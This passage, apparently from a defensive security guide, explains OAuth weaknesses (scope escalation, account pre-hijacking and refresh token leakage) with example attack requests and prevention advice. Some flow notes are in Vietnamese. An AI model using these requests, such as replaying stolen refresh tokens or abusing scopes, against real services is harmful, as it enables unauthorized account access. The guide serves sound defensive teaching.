GET /auth?client_id=CLIENT&scope=profile%20email%20admin HTTP/1.1
```

If the provider does not enforce the client's allowed scopes, a user may unintentionally grant privileged access to an ordinary application. A weak provider may issue the expanded token.

#### 2b. Using a token beyond its granted scope

A token issued with `scope=read` might be accepted by an endpoint that checks token validity but ignores permissions:

```http
GET /api/admin/users HTTP/1.1
Authorization: Bearer READ-ONLY-TOKEN
```

The resource server returns data after verifying the token signature without enforcing `scope`. This flaw belongs to the resource server.

**Assessment steps:**

1. Request privileged scopes and observe the response.
2. Use a low-privilege token against a privileged endpoint and check enforcement.
3. Test scopes associated with other clients at the same provider.

**Prevention:**

- Providers should enforce each client's permitted scopes.
- Resource servers must check permissions before granting access to each endpoint.

### 3. Account pre-hijacking

An attacker may create an account using the victim's email before the victim signs up. When the victim later registers or logs in through OAuth, unsafe account merging may preserve the attacker's access.

A 2022 study by Sudhodanan and Paverd ([USENIX Security 2022](https://arxiv.org/abs/2205.10174)) tested 75 popular services and found at least one such attack in 35 of them (47%).

Consider three variants:

#### 3a. Classic pre-hijacking

The application supports both email/password and OAuth login. When OAuth returns an email matching an existing account, it logs the user into that account:

```text
Attacker đăng ký: email=victim@gmail.com, password=attacker-chosen
Victim đăng nhập OAuth bằng victim@gmail.com
  → ứng dụng tìm thấy tài khoản trùng email
  → merge hoặc đăng nhập vào tài khoản attacker đã tạo
  → Attacker vẫn có thể dùng password cũ để vào
```

This requires inadequate email verification during password registration and unsafe merging based on email alone.

#### 3b. An old session survives OAuth linking

The attacker creates the account and keeps an authenticated session. The victim resets the password or logs in through OAuth with the same email. If the application fails to invalidate old sessions after recovery or merging, the attacker's session remains valid.

#### 3c. Unverified provider email claims

Some providers return `email_verified: false`. If the application ignores this and merges accounts using the email, an attacker may use an unverified provider account with the victim's address:

```json
{
    "sub": "attacker-sub",
    "email": "victim@example.com",
    "email_verified": false
}
```

The application merges the accounts without checking whether the provider verified that email.

**Prevention:**

- Verify email ownership before activating email/password accounts.
- When using provider email for account matching, require appropriate verification, including `email_verified: true` where supported.
- Invalidate prior sessions during sensitive recovery or account-merging operations.
- Notify users when a new OAuth account is linked.

### 4. Refresh token leakage and rotation bypass

Refresh tokens usually outlive access tokens. A leaked refresh token can let an attacker obtain new access tokens without another user login, until expiry or revocation.

#### Leaks through logs and error responses

Some implementations log complete token endpoint requests and responses, including refresh tokens. Anyone able to read application or internal proxy logs may recover them.

Error responses may also echo received secrets:

```json
{
    "error": "invalid_grant",
    "error_description": "Refresh token 'ACTUAL-TOKEN-VALUE' has expired"
}
```

#### Refresh token rotation bypass

With **refresh token rotation**, using a refresh token produces a replacement and invalidates the old one. Reusing an invalidated token can reveal theft.

Concurrency can complicate this: two simultaneous refresh requests, perhaps caused by a network retry, may enter a race over the same token. An attacker who can exploit an implementation's timing window may interfere with rotation or reuse detection.

Without rotation, every place a refresh token is exposed can create a long-lived risk. Unlike a short-lived access token, access may persist until the refresh token expires or is revoked; password changes only help if the provider revokes affected tokens.

```http
POST /token HTTP/1.1
Host: auth.example

grant_type=refresh_token&refresh_token=STOLEN-REFRESH-TOKEN&client_id=CLIENT

→ Response: access_token mới, có thể kèm refresh_token mới
```

**Prevention:**

- Implement refresh token rotation and reuse detection.
- Avoid logging sensitive token endpoint request bodies.
- Grant the minimum necessary permissions.
- Let users inspect and revoke active sessions.
